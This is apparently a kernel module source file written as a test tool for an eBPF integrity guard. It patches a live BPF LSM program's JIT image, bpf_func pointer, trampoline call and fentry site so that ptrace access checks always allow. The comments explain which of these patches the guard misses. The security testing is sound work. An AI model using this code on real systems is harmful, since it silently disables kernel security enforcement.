// SPDX-License-Identifier: GPL-2.0
/*
 * jit_tamper: plays the attacker against the KM's eBPF integrity guard.
 *
 * The guard reports three things -- changed, moved, gone -- but only "gone" has
 * ever been observed, because killing the daemon produces it for free. The other
 * two need someone to actually tamper with a live BPF program, which is what
 * this module does.
 *
 * It is a test tool, not part of the product: it deliberately corrupts kernel
 * state and assumes the target program stays loaded for as long as it does
 * (true while the daemon holds it). Load it on a disposable VM.
 *
 * Modes:
 *   inspect  read-only; dump the target's JIT image so a patch can be chosen
 *   code     flip one inert byte in the prologue     -> guard must see "changed"
 *   raw      write arbitrary bytes at an offset      -> guard must see "changed"
 *   func     repoint prog->bpf_func at a stub        -> guard must see "moved"
 *   tramp    redirect the trampoline's call at a stub -> guard must see "CODE CHANGED"
 *   detach   restore the shim's fentry nop           -> guard must see "UNHOOKED"
 *
 * Both patches are undone on module unload, so a run is: insmod, watch dmesg
 * for the detection, rmmod, watch the next scan come back clean.
 */
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/hex.h>
#include <linux/idr.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/rcupdate.h>

static char *target = "ptrace_access_c";
module_param(target, charp, 0444);
MODULE_PARM_DESC(target, "bpf_prog aux->name to tamper with");

static char *mode = "inspect";
module_param(mode, charp, 0444);
MODULE_PARM_DESC(mode, "inspect | code | raw | func | tramp | detach");

static unsigned int offset;
module_param(offset, uint, 0444);
MODULE_PARM_DESC(offset, "raw mode: byte offset into the JIT image to patch");

static char *patch = "";
module_param(patch, charp, 0444);
MODULE_PARM_DESC(patch, "raw mode: replacement bytes as hex, e.g. 0f1f440001");

static char *shim = "bpf_lsm_ptrace_access_check";
module_param(shim, charp, 0444);
MODULE_PARM_DESC(shim, "LSM shim whose fentry site calls the target's trampoline");

#define MAX_PATCH 16

static unsigned long (*lookup_name)(const char *name);

/*
 * The JIT image is read-only and, since 5.18, lives in a page shared with other
 * programs (bpf_prog_pack), so it cannot simply be made writable -- that would
 * expose everything else on the page too. text_poke_copy() is the same path the
 * JIT itself writes through: it maps the target page into a private address
 * space, writes there, and drops the mapping. Using it means this tool tampers
 * exactly the way the kernel's own patching does, which is also what a real
 * attacker with kernel code execution would reach for.
 *
 * struct bpf_prog is read-only as well (bpf_prog_lock_ro), so the func mode
 * needs the same treatment. text_poke_copy() handles vmalloc addresses.
 */
static void *(*poke)(void *addr, const void *opcode, size_t len);

/*
 * text_poke_copy() deliberately refuses core kernel text -- it WARNs and writes
 * nothing (alternative.c, "if (core_kernel_text(...))"). The fentry site of an
 * LSM shim is core kernel text, so patching it needs the function the kernel
 * itself uses for exactly this site. bpf_arch_text_poke() steps over the
 * endbr64, verifies the instruction it is replacing, and goes through the
 * int3-based live patching path, which is also why an attacker would use it.
 */
static int (*arch_text_poke)(void *ip, enum bpf_text_poke_type old_t,
			     enum bpf_text_poke_type new_t, void *old_addr,
			     void *new_addr);

/* Filled in by dump_call_chain(), which every mode runs. */
static unsigned long shim_start;
static unsigned long tramp_start;
static unsigned long tramp_call;	/* the call inside the trampoline */

static unsigned long lookup_via_kprobe(const char *name)
{
	struct kprobe kp = { .symbol_name = name };
	unsigned long addr;

	if (register_kprobe(&kp) < 0)
		return 0;

	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	return addr;
}

struct find_ctx {
	struct bpf_prog *prog;
	unsigned long func;
	u32 jited_len;
	u32 id;
};

static struct find_ctx found;

static int match_prog(int id, void *p, void *data)
{
	struct bpf_prog *prog = p;
	struct find_ctx *fc = data;

	if (!prog || !prog->jited || !prog->bpf_func || !prog->aux)
		return 0;
	if (strncmp(prog->aux->name, target, BPF_OBJ_NAME_LEN))
		return 0;

	fc->prog = prog;
	fc->func = (unsigned long)prog->bpf_func;
	fc->jited_len = prog->jited_len;
	fc->id = prog->aux->id;
	return 1; /* stops the walk */
}

/*
 * Only the lookup runs under RCU. text_poke_copy() takes text_mutex and so may
 * sleep, which rules out doing the write here.
 */
static int find_target(void)
{
	struct idr *prog_idr = (struct idr *)lookup_name("prog_idr");

	if (!prog_idr) {
		pr_err("jit_tamper: prog_idr not found\n");
		return -ENOENT;
	}

	memset(&found, 0, sizeof(found));
	rcu_read_lock();
	idr_for_each(prog_idr, match_prog, &found);
	rcu_read_unlock();

	if (!found.func) {
		pr_err("jit_tamper: no jited prog named '%s'\n", target);
		return -ENOENT;
	}

	pr_info("jit_tamper: target '%s' id=%u func=%px jited_len=%u\n",
		target, found.id, (void *)found.func, found.jited_len);
	return 0;
}

/* State for undoing the patch on unload. */
static u8 saved_code[MAX_PATCH];
static unsigned int saved_len;
static unsigned int saved_off;
static void *saved_func;

static void dump_jit(void)
{
	u32 n = min_t(u32, found.jited_len, 48);

	pr_info("jit_tamper: first %u bytes: %*phN\n", n, n, (void *)found.func);
}

/*
 * Follow the path the CPU actually takes into the program, which is not
 * prog->bpf_func. The kernel patches the fentry site of the matching bpf_lsm_*
 * shim to call a trampoline, and the trampoline calls the program at an address
 * baked in when the trampoline was generated. Reading both out is what shows
 * that the pointer the guard watches and the pointer the CPU follows are two
 * different things. Read-only throughout.
 */
static void dump_call_chain(void)
{
	unsigned long shim_addr = lookup_name(shim);
	unsigned long tramp = 0;
	unsigned int i;
	s32 rel;
	u8 *p;

	if (!shim_addr) {
		pr_info("jit_tamper: shim '%s' not found\n", shim);
		return;
	}
	shim_start = shim_addr;

	p = (u8 *)shim_addr;
	pr_info("jit_tamper: %s %px: %*phN\n", shim, p, 24, p);

	/*
	 * The fentry site sits a few bytes in, past endbr64 and any padding, and
	 * holds either a call (e8) or a tail jump (e9) into the trampoline.
	 */
	for (i = 0; i < 16; i++) {
		if (p[i] != 0xe8 && p[i] != 0xe9)
			continue;
		memcpy(&rel, p + i + 1, 4);
		tramp = shim_addr + i + 5 + rel;
		pr_info("jit_tamper:   +%u %s -> %px\n", i,
			p[i] == 0xe8 ? "call" : "jmp", (void *)tramp);
		break;
	}

	if (!tramp) {
		pr_info("jit_tamper: no branch at the fentry site; nothing attached\n");
		return;
	}

	tramp_start = tramp;
	pr_info("jit_tamper: trampoline %px: %*phN\n", (void *)tramp, 48, (void *)tramp);

	for (i = 0; i + 5 <= 512; i++) {
		p = (u8 *)tramp + i;
		if (*p != 0xe8 && *p != 0xe9)
			continue;
		memcpy(&rel, p + 1, 4);
		if (tramp + i + 5 + rel == found.func) {
			tramp_call = tramp + i;
			pr_info("jit_tamper: trampoline+%u calls %px directly -- prog->bpf_func is never read\n",
				i, (void *)found.func);
		}
	}
}

static int parse_patch(u8 *out)
{
	size_t len = strlen(patch);
	unsigned int i;

	if (!len || len % 2 || len / 2 > MAX_PATCH) {
		pr_err("jit_tamper: patch must be 1-%d bytes of hex\n", MAX_PATCH);
		return -EINVAL;
	}

	for (i = 0; i < len / 2; i++) {
		if (hex2bin(&out[i], patch + i * 2, 1)) {
			pr_err("jit_tamper: bad hex in patch\n");
			return -EINVAL;
		}
	}
	return len / 2;
}

/* Common tail of code and raw: save what is there, write, read it back. */
static void poke_code(unsigned int off, const u8 *new, unsigned int n)
{
	unsigned long at = found.func + off;

	memcpy(saved_code, (void *)at, n);
	saved_len = n;
	saved_off = off;

	pr_info("jit_tamper: patching +%u: %*phN -> %*phN\n",
		off, n, saved_code, n, new);
	poke((void *)at, new, n);
	pr_info("jit_tamper: now reads %*phN\n", n, (void *)at);
}

/*
 * Every x86_64 BPF prologue starts with endbr64 and then the five-byte NOP that
 * fentry attachment patches:
 *
 *   f3 0f 1e fa       endbr64
 *   0f 1f 44 00 00    nopl 0x0(%rax,%rax,1)
 *
 * This mode changes exactly one byte of that NOP: its displacement. 0F 1F is the
 * architectural multi-byte NOP and is documented not to issue a memory
 * operation, so the displacement is inert, and the encoding stays five bytes
 * whatever it holds. The hash has to notice; the program runs identically.
 *
 * The pattern check is not paranoia. A replacement of the wrong length silently
 * runs into the instruction after it: an earlier attempt wrote the six-byte
 * NOP's first five bytes here, so the NOP absorbed the byte that followed and
 * what was left began with 1f -- invalid in long mode. The hook faulted inside
 * __ptrace_may_access while holding a spinlock, and the machine wedged with
 * every later exec stuck behind it. Anything that patches live kernel text has
 * to verify what it is overwriting first.
 */
static const u8 fentry_nop[] = { 0x0f, 0x1f, 0x44, 0x00, 0x00 };
#define FENTRY_NOP_OFF 4
#define FENTRY_DISP_OFF (FENTRY_NOP_OFF + 4)

static int do_code(void)
{
	u8 disp = 0x01;

	if (found.jited_len < FENTRY_NOP_OFF + sizeof(fentry_nop) ||
	    memcmp((void *)(found.func + FENTRY_NOP_OFF), fentry_nop,
		   sizeof(fentry_nop))) {
		pr_err("jit_tamper: prologue is not the expected fentry nop (%*phN), refusing\n",
		       (int)sizeof(fentry_nop), (void *)(found.func + FENTRY_NOP_OFF));
		return -EINVAL;
	}

	poke_code(FENTRY_DISP_OFF, &disp, 1);
	return 0;
}

/*
 * Arbitrary bytes at an arbitrary offset. Nothing checks that the result decodes
 * to the same length or does the same thing, so a wrong value here takes the
 * machine down -- see the note above. Useful for reproducing a specific
 * corruption; not the mode to reach for by default.
 */
static int do_raw(void)
{
	u8 new[MAX_PATCH];
	int n = parse_patch(new);

	if (n < 0)
		return n;

	if (offset + n > found.jited_len) {
		pr_err("jit_tamper: offset %u + %d bytes is past jited_len %u\n",
		       offset, n, found.jited_len);
		return -ERANGE;
	}

	poke_code(offset, new, n);
	return 0;
}

static bool detached;

/*
 * Put the fentry nop back, which is exactly what detaching does. Attaching an
 * LSM program is a five-byte patch of that nop; undoing it is the same five
 * bytes. The shim body underneath is just "return 0" -- the DEFAULT the
 * LSM_HOOK macro generates -- and 0 is "allow", so the check is gone the
 * instant this lands.
 *
 * The point of the mode is what the guard does about it. The program is still
 * in prog_idr, still at the same address, still hashing the same, so
 * changed/moved/gone all stay quiet while the hook no longer runs.
 */
static int do_detach(void)
{
	int ret;

	if (!shim_start || !tramp_start) {
		pr_err("jit_tamper: no trampoline found for %s\n", shim);
		return -ENOENT;
	}

	ret = arch_text_poke((void *)shim_start, BPF_MOD_JUMP, BPF_MOD_NOP,
			     (void *)tramp_start, NULL);
	if (ret) {
		pr_err("jit_tamper: detach poke failed: %d\n", ret);
		return ret;
	}

	detached = true;
	pr_info("jit_tamper: %s+4 now reads %*phN\n", shim,
		(int)sizeof(fentry_nop), (void *)(shim_start + 4));
	return 0;
}

/*
 * Returning 0 from an LSM program is "allow", so pointing bpf_func here is the
 * whole attack in one step: the hook still exists, still runs, and permits
 * everything. Nothing inside eBPF can notice.
 */
static unsigned int neutered(const void *ctx, const struct bpf_insn *insn)
{
	return 0;
}

static int do_func(void)
{
	void *new = neutered;

	saved_func = (void *)found.func;

	pr_info("jit_tamper: repointing bpf_func %px -> %px\n", saved_func, new);
	poke(&found.prog->bpf_func, &new, sizeof(new));
	pr_info("jit_tamper: bpf_func now %px\n", found.prog->bpf_func);
	return 0;
}

static u8 saved_rel[4];
static bool call_redirected;

/*
 * The attack the program hashes cannot see. The trampoline reaches the program
 * through one call whose target is a rel32, and rewriting those four bytes
 * points it at the stub instead -- so the hook still runs, still returns
 * through the trampoline, and now always allows. It is written with the same
 * text_poke_copy() and lands in the same bpf_prog_pack memory as a JIT patch,
 * which is the whole problem: it costs an attacker no more than the thing the
 * guard was already watching.
 *
 * Redirecting to a stub that returns 0 rather than to nothing keeps this safe
 * to run: the trampoline for ptrace_access_check fires constantly, and a
 * corrupt target would take the machine down instead of demonstrating anything.
 */
static int do_tramp(void)
{
	u8 *site = (u8 *)tramp_call;
	s32 rel;

	if (!tramp_call) {
		pr_err("jit_tamper: no call into the program found in the trampoline\n");
		return -ENOENT;
	}

	rel = (s32)((long)neutered - (long)(tramp_call + 5));

	memcpy(saved_rel, site + 1, sizeof(saved_rel));
	pr_info("jit_tamper: redirecting trampoline call %px -> %px\n",
		(void *)found.func, neutered);
	poke(site + 1, &rel, sizeof(rel));
	call_redirected = true;

	memcpy(&rel, site + 1, sizeof(rel));
	pr_info("jit_tamper: call now targets %px\n",
		(void *)(tramp_call + 5 + rel));
	return 0;
}

static int __init jit_tamper_init(void)
{
	unsigned long addr;
	int ret;

	addr = lookup_via_kprobe("kallsyms_lookup_name");
	if (!addr) {
		pr_err("jit_tamper: cannot resolve kallsyms_lookup_name\n");
		return -ENOENT;
	}
	lookup_name = (unsigned long (*)(const char *))addr;

	poke = (void *)lookup_name("text_poke_copy");
	if (!poke) {
		pr_err("jit_tamper: text_poke_copy not found\n");
		return -ENOENT;
	}

	arch_text_poke = (void *)lookup_name("bpf_arch_text_poke");
	if (!arch_text_poke) {
		pr_err("jit_tamper: bpf_arch_text_poke not found\n");
		return -ENOENT;
	}

	ret = find_target();
	if (ret)
		return ret;

	dump_jit();
	dump_call_chain();

	if (!strcmp(mode, "inspect"))
		return 0;
	if (!strcmp(mode, "code"))
		return do_code();
	if (!strcmp(mode, "raw"))
		return do_raw();
	if (!strcmp(mode, "func"))
		return do_func();
	if (!strcmp(mode, "tramp"))
		return do_tramp();
	if (!strcmp(mode, "detach"))
		return do_detach();

	pr_err("jit_tamper: unknown mode '%s'\n", mode);
	return -EINVAL;
}

static void __exit jit_tamper_exit(void)
{
	if (saved_len) {
		poke((void *)(found.func + saved_off), saved_code, saved_len);
		pr_info("jit_tamper: restored %u bytes at +%u\n", saved_len, saved_off);
	}
	if (call_redirected) {
		poke((u8 *)tramp_call + 1, saved_rel, sizeof(saved_rel));
		pr_info("jit_tamper: restored the trampoline call\n");
		synchronize_rcu();
	}
	if (detached) {
		arch_text_poke((void *)shim_start, BPF_MOD_NOP, BPF_MOD_JUMP,
			       NULL, (void *)tramp_start);
		pr_info("jit_tamper: reattached %s+4: %*phN\n", shim,
			(int)sizeof(fentry_nop), (void *)(shim_start + 4));
	}
	if (saved_func) {
		poke(&found.prog->bpf_func, &saved_func, sizeof(saved_func));
		pr_info("jit_tamper: restored bpf_func to %px\n", saved_func);
		/*
		 * The stub lives in this module's text, and a hook that read
		 * bpf_func just before the restore is still on its way into it.
		 * BPF programs run inside an RCU read-side critical section, so
		 * waiting for a grace period is what makes the text safe to
		 * free.
		 */
		synchronize_rcu();
	}
	pr_info("jit_tamper: unloaded\n");
}

module_init(jit_tamper_init);
module_exit(jit_tamper_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("test tool: tamper with a live BPF program's JIT image");
